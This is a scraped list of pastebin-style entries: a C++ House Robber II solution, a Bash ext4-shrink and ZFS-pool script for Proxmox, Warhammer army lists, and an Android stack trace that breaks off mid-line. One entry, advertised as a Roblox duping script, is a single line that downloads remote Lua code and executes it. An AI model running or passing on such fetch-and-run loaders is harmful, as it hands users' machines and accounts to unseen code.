kZhMPjzJ,House Robber 2 (Leetcode 198) Space Unoptimised Version,Fastrail08,C++,Saturday 19th of July 2025 02:17:20 PM CDT,"class Solution {
public:
    //SPACE IS UNOPTIMISED HERE, AS WE DO BLIND RECURSION AND KEEP TRACK OF WHAT WAS THE LAST HOUSE WE ROBBED. So we need to memoise the lastHouseRobbedIndex which increases the space by a factor of O(n) making the space O(N^2). But THIS SOLUTION IS AN ACCEPTED SOLUTION, with T.C. as O(N^2) only though it will be slow because of extra space declaration and managing it throughout recursion.
    int getMaxMoney(int level, int lastHouseRobbedIndex, int zeroPicked, vector<int> &nums, vector<vector<vector<int> > >&memo){
        int n = nums.size();
        // all houses processed in path.
        if(level >= nums.size()){
            return 0;
        }
        if(lastHouseRobbedIndex != -1 && memo[level][lastHouseRobbedIndex][zeroPicked] != -1){
            return memo[level][lastHouseRobbedIndex][zeroPicked];
        }
        int rob = 0, notRob = 0;
        //levels = each house
        //options = rob or not

        //rob ONLY IF THE LAST HOUSE WAS NOT ROBBED OR THIS IS THE FIRST HOUSE(as there is no last house which could be robbed)
        if(lastHouseRobbedIndex == -1 || level - lastHouseRobbedIndex > 1){ 
            //As the array is circular, make sure the first and last house are never robbed together
            //If the first house is robbed, don't rob the last to avoid breaking property of adjacency
            //If on level (n - 1), don't include if 0th house was robbed
            if(level != n - 1 || !zeroPicked){
                rob = nums[level] + getMaxMoney(level + 1, level, level == 0 ? 1 : zeroPicked, nums, memo);
            } 
        }

        //don't rob - not robbing the house on level makes no impact on the answer being formed as the property that can be violated is only when you rob a house (ADJACENT ROBBERIES), not robbing do not impact property
        notRob = getMaxMoney(level + 1, lastHouseRobbedIndex, zeroPicked, nums, memo);
        if(lastHouseRobbedIndex != -1){
            memo[level][lastHouseRobbedIndex][zeroPicked] = max(rob, notRob);
        }
        return max(rob, notRob);
    }
    int rob(vector<int>& nums) {
        int n = nums.size();
        //memo key = memo(level, lastHouse) = memo(n, n);
        vector<vector<vector<int> > > memo(n, vector<vector<int> >(n, vector<int>(2, -1)));
        return getMaxMoney(0, -1, 0, nums, memo);
    }
};"
d7wwm0fT,Resize EXT4,Varlenthegray,Bash,Saturday 19th of July 2025 01:58:41 PM CDT,"#!/bin/bash

set -euo pipefail

# Configuration - MODIFY THESE VALUES FOR YOUR SETUP
DISK=""/dev/nvme1n1""
EXT4_PART=""${DISK}p1""
ZFS_PART=""${DISK}p2""
MOUNTPOINT=""/mnt/pve/vm-data""
ZFS_POOL=""zfs-vm""
EXT4_RESIZE=""864G""
PARTITION_END=""872GiB""

# Colors for better output readability (because we're fancy like that)
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

abort() {
    echo -e ""${RED}❌ ERROR: $1${NC}""
    exit 1
}

info() {
    echo -e ""${BLUE}ℹ️  INFO: $1${NC}""
}

warn() {
    echo -e ""${YELLOW}⚠️  WARNING: $1${NC}""
}

success() {
    echo -e ""${GREEN}✅ SUCCESS: $1${NC}""
}

check_cmd() {
    ""$@"" || abort ""Command failed: $*""
}

check_mount_absent() {
    mountpoint -q ""$1"" && abort ""$1 is still mounted, aborting.""
}

check_partition_exists() {
    lsblk -no NAME ""$1"" | grep -q ""$(basename ""$2"")"" || abort ""Expected partition $2 not found on $1.""
}

check_partition_absent() {
    lsblk -no NAME ""$1"" | grep -q ""$(basename ""$2"")"" && abort ""Partition $2 already exists on $1.""
}

# Pre-flight checks (because nobody likes surprises)
info ""Starting pre-flight checks...""

# Check if running as root
[[ $EUID -eq 0 ]] || abort ""This script must be run as root (sudo)""

# Check if disk exists
[[ -b ""$DISK"" ]] || abort ""Disk $DISK does not exist or is not a block device""

# Check if partition 1 exists
check_partition_exists ""$DISK"" ""$EXT4_PART""

# Check if partition 2 doesn't exist yet
check_partition_absent ""$DISK"" ""$ZFS_PART""

# Verify current filesystem is ext4
FSTYPE=$(lsblk -no FSTYPE ""$EXT4_PART"")
[[ ""$FSTYPE"" == ""ext4"" ]] || abort ""Partition $EXT4_PART is not ext4 (found: $FSTYPE)""

# Get disk size and verify it makes sense
DISK_SIZE=$(lsblk -bno SIZE ""$DISK"")
DISK_SIZE_GB=$((DISK_SIZE / 1024 / 1024 / 1024))
info ""Disk size: ${DISK_SIZE_GB}GB""

# Verify sizes make sense (rough check)
if [[ $DISK_SIZE_GB -lt 900 ]]; then
    abort ""Disk appears too small (${DISK_SIZE_GB}GB) for the configured partition sizes""
fi

# Get current filesystem usage
FS_USAGE=$(df -BG ""$MOUNTPOINT"" | awk 'NR==2 {print $3}' | sed 's/G//')
info ""Current filesystem usage: ${FS_USAGE}GB""

# Verify we have enough space for the shrink
if [[ $FS_USAGE -gt 850 ]]; then
    abort ""Filesystem usage (${FS_USAGE}GB) is too high to shrink to 864GB safely""
fi

# Get current partition table
info ""Current partition layout:""
lsblk ""$DISK""

# Final confirmation (because YOLO isn't a backup strategy)
echo
warn ""This will:""
warn ""  1. Shutdown all VMs""
warn ""  2. Unmount $MOUNTPOINT""
warn ""  3. Shrink ext4 filesystem to 864GB""
warn ""  4. Shrink partition 1 to 872GiB""
warn ""  5. Create new ZFS partition from 872GiB to end of disk""
warn ""  6. Create ZFS pool '$ZFS_POOL'""
echo
read -p ""Are you absolutely sure you want to continue? (type 'YES' to proceed): "" confirm

if [[ ""$confirm"" != ""YES"" ]]; then
    abort ""Operation cancelled by user. Smart move! 🧠""
fi

# The actual work begins here
success ""Pre-flight checks completed. Starting partition resize...""

echo
info ""Checking if $EXT4_PART is mounted...""
check_mount_absent ""$MOUNTPOINT""

info ""Stopping all running VMs...""
VM_COUNT=$(qm list | awk 'NR>1 {print $1}' | wc -l)
if [[ $VM_COUNT -gt 0 ]]; then
    info ""Found $VM_COUNT VMs to shutdown""
    qm list | awk 'NR>1 {print $1}' | xargs -r -n1 qm shutdown
    info ""Waiting 30 seconds for VMs to shutdown gracefully...""
    sleep 30
    
    # Force stop any remaining running VMs
    RUNNING_VMS=$(qm list | awk 'NR>1 && $3==""running"" {print $1}')
    if [[ -n ""$RUNNING_VMS"" ]]; then
        warn ""Some VMs are still running, forcing stop...""
        echo ""$RUNNING_VMS"" | xargs -r -n1 qm stop
        sleep 5
    fi
else
    info ""No running VMs found""
fi

info ""Unmounting $EXT4_PART from $MOUNTPOINT...""
check_cmd umount ""$MOUNTPOINT""

info ""Verifying ext4 filesystem on $EXT4_PART...""
check_cmd e2fsck -f ""$EXT4_PART""

info ""Shrinking ext4 filesystem to $EXT4_RESIZE...""
info ""This may take several minutes depending on data amount...""
check_cmd resize2fs ""$EXT4_PART"" ""$EXT4_RESIZE""

info ""Resizing partition 1 to $PARTITION_END...""
check_cmd parted -s ""$DISK"" unit GiB resizepart 1 ""$PARTITION_END""

info ""Verifying filesystem after partition resize...""
check_cmd e2fsck -f ""$EXT4_PART""

info ""Remounting $EXT4_PART...""
check_cmd mount ""$EXT4_PART"" ""$MOUNTPOINT""

info ""Creating new ZFS partition after $PARTITION_END...""
check_cmd parted -s ""$DISK"" -- mkpart primary ""$PARTITION_END"" 100%

info ""Waiting for kernel to detect new partition...""
sleep 5
partprobe ""$DISK""
udevadm settle
sleep 2

check_partition_exists ""$DISK"" ""$ZFS_PART""

info ""Creating ZFS pool: $ZFS_POOL...""
check_cmd zpool create ""$ZFS_POOL"" ""$ZFS_PART""

info ""Checking ZFS pool status...""
zpool status ""$ZFS_POOL"" || abort ""ZFS pool creation failed.""

info ""Adding ZFS pool to Proxmox storage config...""
check_cmd pvesm add zfspool ""$ZFS_POOL"" -pool ""$ZFS_POOL""

# Final status check
echo
success ""All steps completed successfully! 🎉""
echo
info ""Final partition layout:""
lsblk ""$DISK""
echo
info ""ZFS pool status:""
zpool status ""$ZFS_POOL""
echo
info ""Storage configuration:""
pvesm status

success ""Your disk surgery was successful! No patients were harmed in the making of this partition. 🏥"""
dJK9a73z,*New* Grow A Garden Duping & Pet Spawning Script 🔥 || Auto Updates ✅ || Free & Keyless ✅,Ps99,Lua,Saturday 19th of July 2025 01:46:26 PM CDT,"loadstring(game:HttpGet(""https://raw.githubusercontent.com/Ps99-cheats/gag/refs/heads/main/script.lua""))()"
qjFDH4wS,Sisters R2,TableTopLive,PHP,Saturday 19th of July 2025 01:01:06 PM CDT,"Champions (1995 points)

Adepta Sororitas
Strike Force (2000 points)
Champions of Faith


CHARACTERS

Canoness with Jump Pack (105 points)
• 1x Blessed halberd
• Enhancement: Mark of Devotion

Hospitaller (65 points)
• 1x Bolt pistol
1x Chirurgeon’s tools
• Enhancement: Triptych of Judgement

Hospitaller (50 points)
• 1x Bolt pistol
1x Chirurgeon’s tools

Junith Eruita (80 points)
• 1x Mace of Castigation
1x Twin Ministorum heavy flamer

Morvenn Vahl (170 points)
• Warlord
• 1x Fidelis
1x Lance of Illumination
1x Paragon missile launcher


BATTLELINE

Battle Sisters Squad (105 points)
• 1x Sister Superior
• 1x Bolt pistol
1x Chainsword
1x Close combat weapon
1x Combi-weapon
• 9x Battle Sister
• 9x Bolt pistol
7x Boltgun
9x Close combat weapon
1x Meltagun
1x Multi-melta
1x Simulacrum Imperialis

Battle Sisters Squad (105 points)
• 1x Sister Superior
• 1x Bolt pistol
1x Close combat weapon
1x Combi-weapon
1x Power weapon
• 9x Battle Sister
• 9x Bolt pistol
7x Boltgun
9x Close combat weapon
1x Meltagun
1x Multi-melta
1x Simulacrum Imperialis


DEDICATED TRANSPORTS

Immolator (115 points)
• 1x Armoured tracks
1x Heavy bolter
1x Hunter-killer missile
1x Twin multi-melta

Sororitas Rhino (75 points)
• 1x Armoured tracks
1x Hunter-killer missile
1x Storm bolter

Sororitas Rhino (75 points)
• 1x Armoured tracks
1x Hunter-killer missile
1x Storm bolter


OTHER DATASHEETS

Castigator (160 points)
• 1x Armoured tracks
1x Castigator battle cannon
3x Heavy bolter
1x Hunter-killer missile
1x Storm bolter

Castigator (160 points)
• 1x Armoured tracks
1x Castigator battle cannon
3x Heavy bolter
1x Hunter-killer missile
1x Storm bolter

Celestian Sacresants (130 points)
• 1x Sacresant Superior
• 1x Inferno pistol
1x Spear of the faithful
• 9x Celestian Sacresant
• 9x Anointed halberd
9x Bolt pistol

Celestian Sacresants (130 points)
• 1x Sacresant Superior
• 1x Inferno pistol
1x Spear of the faithful
• 9x Celestian Sacresant
• 9x Bolt pistol
9x Hallowed mace

Paragon Warsuits (210 points)
• 1x Paragon Superior
• 1x Bolt pistol
1x Multi-melta
1x Paragon storm bolters
1x Paragon war blade
• 2x Paragon
• 2x Bolt pistol
2x Multi-melta
2x Paragon storm bolters
2x Paragon war blade

Seraphim Squad (80 points)
• 1x Seraphim Superior
• 1x Bolt pistol
1x Close combat weapon
1x Plasma pistol
• 4x Seraphim
• 4x Bolt pistol
4x Close combat weapon
4x Ministorum hand flamer

Sisters Novitiate Squad (100 points)
• 1x Novitiate Superior
• 1x Bolt pistol
1x Boltgun
1x Close combat weapon
• 9x Sister Novitiate
• 6x Autogun
9x Autopistol
9x Close combat weapon
2x Ministorum flamer
1x Simulacrum Imperialis

Zephyrim Squad (80 points)
• 1x Zephyrim Superior
• 1x Plasma pistol
1x Power weapon
1x Sacred Banner
• 4x Zephyrim
• 4x Bolt pistol
4x Power Weapon"
2RUh7p63,DG R2,TableTopLive,PHP,Saturday 19th of July 2025 01:00:43 PM CDT,"Hammer (2000 Points)

Death Guard
Mortarion’s Hammer
Strike Force (2,000 Points)

CHARACTERS

Lord of Contagion (110 Points)
• 1x Manreaper

Lord of Contagion (110 Points)
• 1x Manreaper

Lord of Virulence (110 Points)
• Warlord
• 1x Power fist
• 1x Twin plague spewer
• Enhancements: Tendrilous Emissions

OTHER DATASHEETS

Chaos Predator Destructor (145 Points)
• 1x Armoured tracks
• 1x Combi-bolter
• 1x Havoc launcher
• 2x Heavy bolter
• 1x Predator autocannon

Chaos Predator Destructor (145 Points)
• 1x Armoured tracks
• 1x Combi-bolter
• 1x Havoc launcher
• 2x Heavy bolter
• 1x Predator autocannon

Chaos Spawn (80 Points)
• 2x Chaos Spawn
◦ 2x Hideous mutations

Deathshroud Terminators (140 Points)
• 1x Deathshroud Champion
◦ 1x Manreaper
◦ 1x Plaguespurt gauntlet
• 2x Deathshroud Terminator
◦ 2x Manreaper
◦ 2x Plaguespurt gauntlet

Deathshroud Terminators (140 Points)
• 1x Deathshroud Champion
◦ 1x Manreaper
◦ 1x Plaguespurt gauntlet
• 2x Deathshroud Terminator
◦ 2x Manreaper
◦ 2x Plaguespurt gauntlet

Foetid Bloat-Drone (90 Points)
• 1x Fleshmower
• 1x Plague probe

Foetid Bloat-Drone (90 Points)
• 1x Fleshmower
• 1x Plague probe

Foetid Bloat-Drone (90 Points)
• 1x Fleshmower
• 1x Plague probe

Foetid Bloat-Drone with Heavy Blight Launcher (100 Points)
• 1x Heavy blight launcher
• 1x Plague probe

Foetid Bloat-Drone with Heavy Blight Launcher (100 Points)
• 1x Heavy blight launcher
• 1x Plague probe

Foetid Bloat-Drone with Heavy Blight Launcher (100 Points)
• 1x Heavy blight launcher
• 1x Plague probe

Myphitic Blight-Haulers (90 Points)
• 1x Bile spurt
• 1x Gnashing maw
• 1x Missile launcher
• 1x Multi-melta

Myphitic Blight-Haulers (90 Points)
• 1x Bile spurt
• 1x Gnashing maw
• 1x Missile launcher
• 1x Multi-melta

Myphitic Blight-Haulers (90 Points)
• 1x Bile spurt
• 1x Gnashing maw
• 1x Missile launcher
• 1x Multi-melta

Poxwalkers (60 Points)
• 10x Poxwalker
◦ 10x Improvised weapon

Poxwalkers (60 Points)
• 10x Poxwalker
◦ 10x Improvised weapon

Poxwalkers (60 Points)
• 10x Poxwalker
◦ 10x Improvised weapon
"
6CXpbtMi,2025-07-19T19:38:39.352,powerampache,PHP,Saturday 19th of July 2025 12:38:39 PM CDT,"1.01-76 (76) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:737)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:709)
	at android.os.Handler.dispatchMessage(Handler.java:102)
	at android.os.Looper.loop(Looper.java:236)
	at android.os.HandlerThread.run(HandlerThread.java:67)
Caused by: androidx.media3.datasource.HttpDataSource$HttpDataSourceException: java.net.SocketException: Connection reset
	at androidx.media3.datasource.DefaultHttpDataSource.open(DefaultHttpDataSource.java:370)
	at androidx.media3.datasource.DefaultDataSource.open(DefaultDataSource.java:275)
	at androidx.media3.datasource.StatsDataSource.open(StatsDataSource.java:87)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1085)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1167)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:641)
	at java.lang.Thread.run(Thread.java:923)
Caused by: java.net.SocketException: Connection reset
	at java.net.SocketInputStream.read(SocketInputStream.java:215)
	at java.net.SocketInputStream.read(SocketInputStream.java:144)
	at com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream.readFromSocket(ConscryptEngineSocket.java:936)
	at com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream.processDataFromSocket(ConscryptEngineSocket.java:900)
	at com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream.access$100(ConscryptEngineSocket.java:722)
	at com.android.org.conscrypt.ConscryptEngineSocket.doHandshake(ConscryptEngineSocket.java:238)
	at com.android.org.conscrypt.ConscryptEngineSocket.startHandshake(ConscryptEngineSocket.java:217)
	at com.android.okhttp.internal.io.RealConnection.connectTls(RealConnection.java:196)
	at com.android.okhttp.internal.io.RealConnection.connectSocket(RealConnection.java:153)
	at com.android.okhttp.internal.io.RealConnection.connect(RealConnection.java:116)
	at com.android.okhttp.internal.http.StreamAllocation.findConnection(StreamAllocation.java:186)
	at com.android.okhttp.internal.http.StreamAllocation.findHealthyConnection(StreamAllocation.java:128)
	at com.android.okhttp.internal.http.StreamAllocation.newStream(StreamAllocation.java:97)
	at com.android.okhttp.internal.http.HttpEngine.connect(HttpEngine.java:289)
	at com.android.okhttp.internal.http.HttpEngine.sendRequest(HttpEngine.java:232)
	at com.android.okhttp.internal.huc.HttpURLConnectionImpl.execute(HttpURLConnectionImpl.java:465)
	at com.android.okhttp.internal.huc.HttpURLConnectionImpl.connect(HttpURLConnectionImpl.java:131)
	at com.android.okhttp.internal.huc.DelegatingHttpsURLConnection.connect(DelegatingHttpsURLConnection.java:90)
	at com.android.okhttp.internal.huc.HttpsURLConnectionImpl.connect(HttpsURLConnectionImpl.java:30)
	at androidx.media3.datasource.DefaultHttpDataSource.makeConnection(DefaultHttpDataSource.java:644)
	at androidx.media3.datasource.DefaultHttpDataSource.makeConnection(DefaultHttpDataSource.java:525)
	at androidx.media3.datasource.DefaultHttpDataSource.open(DefaultHttpDataSource.java:364)
	... 7 more

onPlayerError HttpDataSourceException - PlaybackException 
Error Code: 2001. Erreur lors de la lecture de ce morceau.
{""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":72},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":2001,""extras"":{""mMap"":{}},""timestampMs"":167912070,""cause"":{""dataSpec"":{""absoluteStreamPosition"":0,""flags"":6,""httpMethod"":1,""httpRequestHeaders"":{""Icy-MetaData"":""1""},""length"":-1,""position"":0,""uri"":{},""uriPositionOffset"":0},""type"":1,""reason"":2001,""cause"":{""detailMessage"":""Connection reset"",""stackTrace"":[{""declaringClass"":""java.net.SocketInputStream"",""fileName"":""SocketInputStream.java"",""lineNumber"":215,""methodName"":""read""},{""declaringClass"":""java.net.SocketInputStream"",""fileName"":""SocketInputStream.java"",""lineNumber"":144,""methodName"":""read""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":936,""methodName"":""readFromSocket""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":900,""methodName"":""processDataFromSocket""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":722,""methodName"":""access$100""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":238,""methodName"":""doHandshake""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":217,""methodName"":""startHandshake""},{""declaringClass"":""com.android.okhttp.internal.io.RealConnection"",""fileName"":""RealConnection.java"",""lineNumber"":196,""methodName"":""connectTls""},{""declaringClass"":""com.android.okhttp.internal.io.RealConnection"",""fileName"":""RealConnection.java"",""lineNumber"":153,""methodName"":""connectSocket""},{""declaringClass"":""com.android.okhttp.internal.io.RealConnection"",""fileName"":""RealConnection.java"",""lineNumber"":116,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.http.StreamAllocation"",""fileName"":""StreamAllocation.java"",""lineNumber"":186,""methodName"":""findConnection""},{""declaringClass"":""com.android.okhttp.internal.http.StreamAllocation"",""fileName"":""StreamAllocation.java"",""lineNumber"":128,""methodName"":""findHealthyConnection""},{""declaringClass"":""com.android.okhttp.internal.http.StreamAllocation"",""fileName"":""StreamAllocation.java"",""lineNumber"":97,""methodName"":""newStream""},{""declaringClass"":""com.android.okhttp.internal.http.HttpEngine"",""fileName"":""HttpEngine.java"",""lineNumber"":289,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.http.HttpEngine"",""fileName"":""HttpEngine.java"",""lineNumber"":232,""methodName"":""sendRequest""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineNumber"":465,""methodName"":""execute""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineNumber"":131,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.huc.DelegatingHttpsURLConnection"",""fileName"":""DelegatingHttpsURLConnection.java"",""lineNumber"":90,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpsURLConnectionImpl"",""fileName"":""HttpsURLConnectionImpl.java"",""lineNumber"":30,""methodName"":""connect""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":644,""methodName"":""makeConnection""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":525,""methodName"":""makeConnection""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":364,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":87,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1085,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1167,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":641,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":923,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""java.net.SocketException: Connection reset"",""stackTrace"":[{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":370,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":87,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1085,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1167,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":641,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":923,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":709,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":236,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}],""suppressedExceptions"":[]}
 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":72},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":2001,""extras"":{""mMap"":{}},""timestampMs"":167912070,""cause"":{""dataSpec"":{""absoluteStreamPosition"":0,""flags"":6,""httpMethod"":1,""httpRequestHeaders"":{""Icy-MetaData"":""1""},""length"":-1,""position"":0,""uri"":{},""uriPositionOffset"":0},""type"":1,""reason"":2001,""cause"":{""detailMessage"":""Connection reset"",""stackTrace"":[{""declaringClass"":""java.net.SocketInputStream"",""fileName"":""SocketInputStream.java"",""lineNumber"":215,""methodName"":""read""},{""declaringClass"":""java.net.SocketInputStream"",""fileName"":""SocketInputStream.java"",""lineNumber"":144,""methodName"":""read""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":936,""methodName"":""readFromSocket""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":900,""methodName"":""processDataFromSocket""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":722,""methodName"":""access$100""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":238,""methodName"":""doHandshake""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":217,""methodName"":""startHandshake""},{""declaringClass"":""com.android.okhttp.internal.io.RealConnection"",""fileName"":""RealConnection.java"",""lineNumber"":196,""methodName"":""connectTls""},{""declaringClass"":""com.android.okhttp.internal.io.RealConnection"",""fileName"":""RealConnection.java"",""lineNumber"":153,""methodName"":""connectSocket""},{""declaringClass"":""com.android.okhttp.internal.io.RealConnection"",""fileName"":""RealConnection.java"",""lineNumber"":116,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.http.StreamAllocation"",""fileName"":""StreamAllocation.java"",""lineNumber"":186,""methodName"":""findConnection""},{""declaringClass"":""com.android.okhttp.internal.http.StreamAllocation"",""fileName"":""StreamAllocation.java"",""lineNumber"":128,""methodName"":""findHealthyConnection""},{""declaringClass"":""com.android.okhttp.internal.http.StreamAllocation"",""fileName"":""StreamAllocation.java"",""lineNumber"":97,""methodName"":""newStream""},{""declaringClass"":""com.android.okhttp.internal.http.HttpEngine"",""fileName"":""HttpEngine.java"",""lineNumber"":289,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.http.HttpEngine"",""fileName"":""HttpEngine.java"",""lineNumber"":232,""methodName"":""sendRequest""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineNumber"":465,""methodName"":""execute""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineNumber"":131,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.huc.DelegatingHttpsURLConnection"",""fileName"":""DelegatingHttpsURLConnection.java"",""lineNumber"":90,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpsURLConnectionImpl"",""fileName"":""HttpsURLConnectionImpl.java"",""lineNumber"":30,""methodName"":""connect""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":644,""methodName"":""makeConnection""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":525,""methodName"":""makeConnection""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":364,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":87,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1085,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1167,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":641,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":923,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""java.net.SocketException: Connection 